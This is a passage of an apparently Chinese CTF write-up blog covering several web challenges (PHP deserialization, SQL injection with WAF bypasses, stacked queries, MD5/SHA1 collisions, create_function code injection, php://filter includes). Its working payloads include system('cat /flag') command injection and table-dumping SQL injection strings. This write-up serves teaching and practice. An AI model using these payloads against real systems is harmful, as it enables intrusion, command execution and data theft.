invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<p>payload1:(加 %00)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>payload2:(直接用 url 编码后的)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>\n<h3 id=\"10easyp\"><a class=\"markdownIt-Anchor\" href=\"#10easyp\">#</a> 10.EasyP</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;utils.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$guess</span> = (<span class=\"keyword\">string</span>) <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$guess</span> === <span class=\"variable\">$secret</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Congratulations! The flag is: &#x27;</span> . <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/utils\\.php\\/*$/i&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/show_source/&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REQUEST_URI&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>1. <code>$_SERVER['PHP_SELF']</code> <br>\n 返回的是当前正在执行的脚本的相对路径<br>\n 2.basename ()<br>\n 返回给定路径的最后一个组成部分，不包括查询参数和父目录，回当前执行的 PHP 脚本的文件名<br>\n eg.<br>\n![[Pasted image 20230428144618.png]]<br>\n![[Pasted image 20230428144802.png]]<br>\n <code>$_SERVER['REQUEST_URI']</code> <br>\n 包含了当前正在执行的脚本的相对路径以及任何查询字符串<br>\n！[[Pasted image 20230428145113.png]]<br>\n 怎么绕过呢？</p>\n<ol>\n<li>可以在 utils.php 后加一个字符，比如 % ff (非 ASCII 字符), 随便一个汉字给 url 编码就行，绕过第一个 preg_match 并且 basename () 无法处理非 ASCII 字符会直接获取 utils.php</li>\n<li>第二个正则绕过方式是加 Url 编码绕过，参数名至少需要一个或者以上进行 Url 编码或者 show.source, <code>show[source</code> <br>\npayload:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php/utils.php/%ff?show.source=1</span><br><span class=\"line\">index.php/utils.php/%ff?show[source=1</span><br><span class=\"line\">index.php/utils.php/%ff?%73how_source=1</span><br><span class=\"line\">index.php/utils.php/%E5%93%88(中文汉字哈的url编码)?show.source=1</span><br><span class=\"line\">........</span><br></pre></td></tr></table></figure>\n<h3 id=\"11swpuctf-2021-新生赛sql\"><a class=\"markdownIt-Anchor\" href=\"#11swpuctf-2021-新生赛sql\">#</a> 11.[SWPUCTF 2021 新生赛] sql</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=1 正常</span><br><span class=\"line\">?wllm=1&#x27; 报语法错误</span><br><span class=\"line\">?wllm=1&#x27;--+ 有waf,疑似过滤+,换了#发现也被过滤</span><br><span class=\"line\">?wllm=1&#x27;%23  正常,用url绕过</span><br><span class=\"line\">经过测试此题过滤了空格和等号</span><br><span class=\"line\">空格=&gt;/**/</span><br><span class=\"line\">等号=&gt;like</span><br><span class=\"line\">开始注入</span><br><span class=\"line\">?wllm=1&#x27;order/**/by/**/3%23  正常,4就错误,所以字段为3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,3%23  回显位是2和3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/databse()%23</span><br><span class=\"line\">发现LTLT_flag(flag应该在这里),users</span><br><span class=\"line\">查列常规操作</span><br><span class=\"line\">得到id,flag,id,username</span><br><span class=\"line\">查内容这里只能看到前面,substr,right,reverse都被过滤,只能用mid截取(因为回显只能有20个，所以1次20个)</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,mid(group_concat(flag),1,20)/**/from/**/LTLT_flag%23</span><br><span class=\"line\">读三次(0,20)(20,20)(40,20)</span><br></pre></td></tr></table></figure>\n<h3 id=\"12随便注\"><a class=\"markdownIt-Anchor\" href=\"#12随便注\">#</a> 12. 随便注</h3>\n<p>字符型，过滤了 select,update,delete,drop,insert,where 和., 不区分大小写</p>\n<h4 id=\"116进制编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#116进制编码绕过\">#</a> 1.16 进制编码绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from `1919810931114514`</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2其他函数替代\"><a class=\"markdownIt-Anchor\" href=\"#2其他函数替代\">#</a> 2. 其他函数替代</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;handler `1919810931114514` open;handler `1919810931114514` read next;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3alter注入\"><a class=\"markdownIt-Anchor\" href=\"#3alter注入\">#</a> 3.alter 注入</h4>\n<p>修改表名 <code>alter table 表名 rename 新表名;</code> <br>\n 修改字段名 <code>alter table 表名 change 旧字段名 新字段名 类型;</code> <br>\npayload:<br>\n 修改 words 表名为 words1<br>\n <code>alter table words rename words1;</code> <br>\n 修改 1919810931114514 表名为 words<br>\n <code>alter table 1919810931114514 rename words;</code> <br>\n 修改新的 words 表中的 flag 列名为 id<br>\n <code>alter table words change flag id varchar(60);</code> <br>\n 结合:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;;alter table words rename words1;alter table` 1919810931114514 `rename words;alter table words change flag id varchar(60);#</span></span><br></pre></td></tr></table></figure>\n<p>然后查 id=1 就行</p>\n<h3 id=\"13level-up\"><a class=\"markdownIt-Anchor\" href=\"#13level-up\">#</a> 13.level-up</h3>\n<p>先查看源代码发现这个注释</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- here is level 1 --&gt;</span><br><span class=\"line\">&lt;!-- disallow: --&gt;</span><br></pre></td></tr></table></figure>\n<p>说明要看 robots.txt, 发现 level_2_1s_h3re.php<br>\n (string) 用法:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"number\">3</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_num</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$num</span>; <span class=\"comment\">// 结果: &quot;3&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$bool</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_bool</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$bool</span>; <span class=\"comment\">// 结果: &quot;1&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$null_value</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_null_value</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$null_value</span>; <span class=\"comment\">// 结果: &quot;&quot;（空字符串），字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$arr</span> = <span class=\"keyword\">array</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"variable\">$str_arr</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$arr</span>; <span class=\"comment\">// 结果: &quot;Array&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$obj</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">stdClass</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj</span>-&gt;name = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_obj</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$obj</span>; <span class=\"comment\">// 结果: &quot;stdClass Object&quot;，字符串类型</span></span><br></pre></td></tr></table></figure>\n<p>数组绕过失效，要 md5 强碰撞<br>\n payload:<br>\narray1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>\n<mark> 这里要用 burp 抓包改传参方式为 post 才可以，hackbar 不知道为什么没有用</mark><br>\n更多关于 md5 的绕过看我这篇博客<a href=\"https://hq185187.github.io/2023/04/30/md5/\"> md5</a><br>\n 找到 Level___3.php<br>\n 然后就是 sha1 的强碰撞，sha1 的绕过和 md5 几乎一样<br>\n下面给一个大佬的 sha1 强碰撞的 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>\n<p>然后得到 level_level_4.php<br>\nPHP 会将请求参数的非法字符转换成下划线 (空格，点)<br>\nNI+SA+=txw4ever<br>\n 拓展:<br>\nPHP 需要将所有参数转换成有效的变量名，因此再解析字符串时，会做两件事:</p>\n<ol>\n<li>删除空白符</li>\n<li>将某些字符串转换为下划线<br>\n加号 (%2b) 空格 (%20) 点号 (%2e) <code>[(%5b)</code>  和_(%5f)</li>\n</ol>\n<p>得到 55_5_55.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//sorry , here is true last level</span></span><br><span class=\"line\"><span class=\"comment\">//^_^</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;str.php&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span>(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$b</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里要学一个新知识:create_function 代码注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$test</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">相当于:</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"variable\">$a</span>+<span class=\"variable\">$b</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>来个注入例子</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#125;eval($_POST[&quot;a&quot;]);/*)</span></span><br><span class=\"line\"><span class=\"string\">相当于</span></span><br><span class=\"line\"><span class=\"string\">function test($a,$b)&#123;</span></span><br><span class=\"line\"><span class=\"string\">return($a+$b);&#125;</span></span><br><span class=\"line\"><span class=\"string\">eval($_POST[&quot;a&quot;]);/*</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>直接构造 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;ls /&quot;);/*</span><br><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;cat /flag&quot;);/*</span><br></pre></td></tr></table></figure>\n<h3 id=\"14鹏城杯-2022简单包含\"><a class=\"markdownIt-Anchor\" href=\"#14鹏城杯-2022简单包含\">#</a> 14.[鹏城杯 2022] 简单包含</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=php://filter/convert.base64-encode/resource=flag.php发现被过滤</span><br><span class=\"line\">flag=php://filter/convert.base64-encode/resource=index.php看源码</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;flag&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>)) &lt; <span class=\"number\">800</span> &amp;&amp; <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/&#x27;</span>, <span class=\"variable\">$path</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nssctf waf!&#x27;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span>(<span class=\"variable\">$path</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>post 的数据里有有 flag 并且 &gt;=800<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=aaaa(800个a)&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>",
            "tags": []
        }
    ]
}